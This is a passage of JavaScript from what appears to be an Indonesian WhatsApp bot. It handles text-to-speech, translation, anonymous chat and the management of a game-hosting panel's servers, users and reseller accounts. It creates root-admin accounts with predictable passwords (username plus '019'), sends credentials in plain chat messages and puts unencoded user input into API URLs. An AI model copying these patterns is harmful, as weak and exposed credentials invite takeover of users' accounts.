if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Aira`)
newReply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('#nuliskanan', m.sender, _cmd)
Aira.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'foliokiri': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Aira`)
newReply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('#foliokiri', m.sender, _cmd)
Aira.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'foliokanan': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Aira`)
newReply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('#foliokanan', m.sender, _cmd)
Aira.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'say':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Aira`)
addCountCmd('#say', m.sender, _cmd)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
newReply(e + '')
res = await tts(text)
} finally {
Aira.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {})
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'translate': case 'tr': {
if (!text) return newReply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
Aira.sendText(m.chat, `${res.text}`, m)
})
}
limitAdd(m.sender, limit)
break

case 'anonymouschat': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
newReply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
send1ButReply(m.chat,`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`,'Start','Start','.Start','gaada')
 }
break
case 'keluar': case 'stop': case 'leave': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
send1ButReply(m.chat,`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`,'Start','Start','.Start','gaada')
throw false
}
newReply('Berhasil keluar dari anonymous chat')
let other = room.other(m.sender)
if (other) await Aira.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
break
case 'mulai': case 'start': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
send1ButReply(m.chat,`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`,'Keluar','Keluar','.keluar','gaada')
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
send2ButReply(room.a, `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}next -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`,'Next','Next','.next','Stop','Stop','.stop','gaada')
room.b = m.sender
room.state = 'CHATTING'
send2ButReply(m.chat, `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}next -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`,'Next','Next','.next','Stop','Stop','.stop','gaada')
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
send1ButReply(m.chat,`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`,'Start','Start','.start','gaada')
throw false
}
let other = romeo.other(m.sender)
if (other) await Aira.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
send2ButReply(room.a, `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}next -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`,'Next','Next','.next','Stop','Stop','.stop','gaada')
room.b = m.sender
room.state = 'CHATTING'
send2ButReply(m.chat, `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}next -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`,'Next','Next','.next','Stop','Stop','.stop','gaada')
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
newReply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await Aira.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
throw false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var res = await Aira.sendContact(partnerJID, [m.sender.split("@")[0]])
Aira.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
Aira.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
}
break
//panel menu

case "panel": {
  const owned = `${setting.ownerNumber}`
  const text12 = `*Hi @${m.sender.split("@")[0]} 👋*
  
  CPANEL 
  BY Ryudev
  
  CARA ADD USER PANEL :
  ram user,nomer
  
  contoh : 1gb Ryu,6282196776245
  
  Powered By *@${owned.split("@")[0]}*
  ▬▭▬▭▬▭▬▭▬▭▬▭▬`
  Aira.sendMessage(m.chat, { text: text12, contextInfo: { mentionedJid: [m.sender, setting.ownerNumber], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
  }
  break
case 'turnon':case 'startsaira': case 'startServer':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply(`GUNAKAN DENGAN CARA ${prefix}${command} idserver\n\ncontoh: ${prefix}${command} 1`)
newReply('Sedang Menyalakan')
/*let f = await fetch(`${setting.pdomain}/api/client/servers/${text}/power`, {
  "method": "POST",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.capikey
  },
  "body": JSON.stringify({
  "signal": "start",
})
})
console.log(f)*/


await fetch(`${setting.pdomain}/api/application/servers/${text}/power`, {
  "method": "POST",
  "headers": {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer "+ setting.capikey
  },
  "body": JSON.stringify({
    "signal": "start"
  })
})
  .then(response => console.log(response))
  .catch(err => console.error(err));
}
break
case 'reinstall': {
    if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
    let srv = args[0]
    if (!srv) return newReply('ID nya mana?')
    let f = await fetch(setting.pdomain + "/api/application/servers/" + srv + "/reinstall", {
    "method": "POST",
    "headers": {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + setting.apikey
    }
    })
    let res = f.ok ? {
    errors: null
    } : await f.json()
    if (res.errors) return newReply('*SERVER NOT FOUND*')
    newReply('*REINSTALLING THE SERVER..*')
    }
break
case 'updatesrv': {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  let t = text.split(',');
  if (t.length < 4) return newReply(`*Format salah*
  \nPenggunaan:
  ${prefix + command} srvId,locId,memory/disk,cpu`)

  let srv = t[0];
  let loc = t[1];
  let memo_disk = t[2].split`/`;
  let cpu = t[3];
  let f1 = await fetch(setting.pdomain + "/api/application/servers/" + srv, {
  "method": "GET",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.apikey
  }
  })
  let data = await f1.json()
  
  let f = await fetch(setting.pdomain + "/api/application/servers/" + srv + "/build", {
  "method": "PATCH",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.apikey
  },
  "body": JSON.stringify({
  "allocation": parseInt(loc) || data.attributes.allocation,
  "memory": memo_disk[0] || data.attributes.limits.memory,
  "swap": data.attributes.limits.swap || 0,
  "disk": memo_disk[1] || data.attributes.limits.disk,
  "io": 500,
  "cpu": cpu || data.attributes.limits.cpu,
  "threads": null,
  "feature_limits": {
  "databases": 5,
  "allocations": 5,
  "backups": 5
  }
  })
  })
  let res = await f.json()
  if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
  let server = res.attributes
  newReply(`*SUCCESSFULLY UPDATED THE SERVER*
  
  TYPE: ${res.object}
  
  ID: ${server.id}
  UUID: ${server.uuid}
  NAME: ${server.name}
  DESCRIPTION: ${server.description}
  MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
  DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
  CPU: ${server.limits.cpu}%
  CREATED AT: ${week} ${date}
  UPDATED AT: ${server.updated_at}`)
  }
break
case "listsrv": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!args[0]) return newReply(`Masukkan Halaman User Yang Ingin Dilihat\ncontoh:  ${prefix}${command} 1`)
  let page = args[0];
  let f = await fetch(setting.pdomain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + setting.apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(setting.pdomain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + setting.capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Aira.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    newReply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "listusr": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!args[0]) return newReply(`Masukkan Halaman User Yang Ingin Dilihat\ncontoh:  ${prefix}${command} 1`)
  let page = args[0];
  let f = await fetch(setting.pdomain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + setting.apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID User: ${u.id} \n - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Aira.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
  newReply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "delsrv": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let srv = args[0]
if (!srv) return newReply(`ID nya mana? Untuk Mengetahui ID Server Silahkan Ketik ${prefix}listsrv`)
let f = await fetch(setting.pdomain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let usr = args[0]
if (!usr) return newReply(`ID nya mana? Untuk Mengetahui ID Server Silahkan Ketik ${prefix}listusr`)
let f = await fetch(setting.pdomain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply('*USER NOT FOUND*')
newReply('*SUCCESSFULLY DELETE THE USER*')
}
break
case "addusr": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  let t = text.split(',');
  if (t.length < 3) return newReply(`*Format salah!*
  
  Penggunaan:
  ${prefix + command} email,username,name,number/tag`);
  let email = t[0];
  let username = t[1];
  let name = t[2];
  let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
  if (!u) return m.reply(`*Format salah!*
  
  Penggunaan:
  ${prefix + command} email,username,name,number/tag`);
  let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
  let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
  let f = await fetch(setting.pdomain + "/api/application/users", {
  "method": "POST",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.apikey
  },
  "body": JSON.stringify({
  "email": email,
  "username": username,
  "first_name": name,
  "last_name": "Memb",
  "language": "en",
  "password": password.toString()
  })
  })
  let data = await f.json();
  if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
  let user = data.attributes
  let p = await Aira.sendMessage(m.chat, { text: `
  *SUCCESSFULLY ADD USER*
  
  ╭─❏ *『 USER INFO 』*
  ┣❐ ➤ *ID* : ${user.id}
  ┣❏ ➤ *USERNAME* : ${user.username}
  ┣❏ ➤ *EMAIL* : ${user.email}
  ┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
  ┣❏ ➤ *CREATED AT* :  ${tanggal(new Date())} ${time}
  ┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
  })
  Aira.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
  ╭─❏ *『 USER INFO 』*
  ┣❏ ➤ *📧EMAIL* : ${email}
  ┣❏ ➤ *👤USERNAME* : ${username}
  ┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
  ┣❏ ➤ *🌐LOGIN* : ${setting.pdomain}
  ┗⬣`,
  })
  }
break
case "crateadmin": case "createadmin": {
  if (!isCreator) return newReply(mess.OnlyOwner)
    
    let s = q.split(',')
    let email = s[0];
    let username = s[0]
    let nomor = s[1]
    if (s.length < 2) return newReply(`*Format salah!*
    Penggunaan:
    ${prefix + command} user,nomer`)
    if (!username) return newReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
    if (!nomor) return newReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
    let password = username + "019"
    let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    let f = await fetch(setting.pdomain + "/api/application/users", {
    "method": "POST",
    "headers": {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Authorization": "Bearer " + setting.apikey
    },
    "body": JSON.stringify({
    "email": username + "@gmail.com",
    "username": username,
    "first_name": username,
    "last_name": "Memb",
    "language": "en",
     "root_admin" : true,  
    "password": password.toString()
    })
    
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let tks = `
TYPE: user
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())} ${time}
🖥️LOGIN: ${setting.pdomain}`

const listMessage = {text: tks,}
await Aira.sendMessage(m.chat, listMessage)
await Aira.sendMessage(nomornya, {    
text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
    
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${setting.pdomain}
    
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4    
*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4
    
*WEB OWNER :*
https://ryudev.biz.id
    
*GRUP GC STORE HARAP JOIN !*
${setting.gcstore}
    
*GRUP OWNER :*
${setting.gcwa}
  
    *NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*`,})
}
break
case "listadmin": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(setting.pdomain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + setting.apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Aira.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "addsrv": {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  let s = text.split(',');
  if (s.length < 7) return newReply(`*Format salah!*
  
  Penggunaan:
  ${prefix + command} name,tanggal,userId,eggId,nodeid,memory/disk,cpu\ncontoh :  ${prefix}${command} ryu,17,6,16,1,0/0,0`)
  let name = s[0];
  let desc = s[1] || ''
  let usr_id = s[2];
  let egg = s[3];
  let loc = s[4];
  let memo_disk = s[5].split`/`;
  let cpu = s[6];
  let f1 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
  "method": "GET",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.apikey
  }
  })
  let data = await f1.json();
  let startup_cmd = data.attributes.startup
  
  let f = await fetch(setting.pdomain + "/api/application/servers", {
  "method": "POST",
  "headers": {
  "Accept": "application/json",
  "Content-Type": "application/json",
  "Authorization": "Bearer " + setting.apikey,
  },
  "body": JSON.stringify({
  "name": name,
  "description": desc,
  "user": usr_id,
  "egg": parseInt(egg),
  "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
  "startup": startup_cmd,
  "environment": {
  "INST": "npm",
  "USER_UPLOAD": "0",
  "AUTO_UPDATE": "0",
  "CMD_RUN": "npm start"
  },
  "limits": {
  "memory": memo_disk[0],
  "swap": 0,
  "disk": memo_disk[1],
  "io": 500,
  "cpu": cpu
  },
  "feature_limits": {
  "databases": 5,
  "backups": 5,
  "allocations": 5
  },
  deploy: {
  locations: [parseInt(loc)],
  dedicated_ip: false,
  port_range: [],
  },})})
  let res = await f.json()
  if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
  let server = res.attributes
  newReply(`*SUCCESSFULLY ADD SERVER*
  
-TYPE: ${res.object}
-ID: ${server.id}
-UUID: ${server.uuid}
-NAME: ${server.name}
-DESCRIPTION: ${server.description}
-MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
-CPU: ${server.limits.cpu}%
-CREATED AT: ${tanggal(new Date())} ${time}`)
}
break
//Reseller menu

case "1gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "1000"
let cpu = "30"
let disk = "1000"
let email = username + getRandom('@gmail.com')
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*👤USERNAME* : ${user.username}
*🔐PASSWORD* : ${password}
*🌐LOGIN* : ${setting.pdomain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "2gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return NewReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "2000"
let cpu = "60"
let disk = "2000"
let email = username + getRandom('@gmail.com')
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

